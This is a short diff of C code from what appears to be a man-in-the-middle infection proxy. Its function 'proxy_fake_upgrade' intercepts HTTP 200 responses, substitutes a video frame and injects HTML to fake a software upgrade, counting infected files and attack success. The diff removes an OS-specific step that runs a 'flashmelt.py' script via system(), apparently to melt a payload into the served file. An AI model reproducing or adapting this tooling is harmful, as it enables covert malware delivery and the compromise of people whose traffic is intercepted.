@@ -83,40 +83,6 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	 fbio = BIO_new(BIO_f_null());
          inject_len = 0;
       } else if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
-	 char *cmd_melt = NULL;
-
-	 switch (os) {
-	 case WINDOWS:
-	     DEBUG_MSG(D_INFO, "Windows detected, melting...");
-	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
-	     break;
-
-	  case OSX:
-             DEBUG_MSG(D_INFO, "OS X detected, melting...");
-	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
-             break;
-
-	 case LINUX:
-	     DEBUG_MSG(D_INFO, "Linux detected, melting...");
-	     ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
-	     break;
-
-	 case UNKNOWN:
-	     break;
-	 }
-
-	 if (ret == -1)
-            DEBUG_MSG(D_ERROR, "Melting allocation failed");
-
-	 ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
-
-         ret = system(cmd_melt);
-
-	 if (ret == -1 || ret == 127)
-            DEBUG_MSG(D_ERROR, "Melting failed");
-
-         free(cmd_melt);
-
          DEBUG_MSG(D_INFO, "Substituting video frame...");
       
          char *html_to_inject = NULL;
@@ -150,8 +116,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
          GBL_STATS->inf_files++;
 
          attack_success = 1;
-      }else{
-
+      } else {
          DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
          DEBUG_MSG(D_DEBUG, "Server reply is:\n%s", data);
 
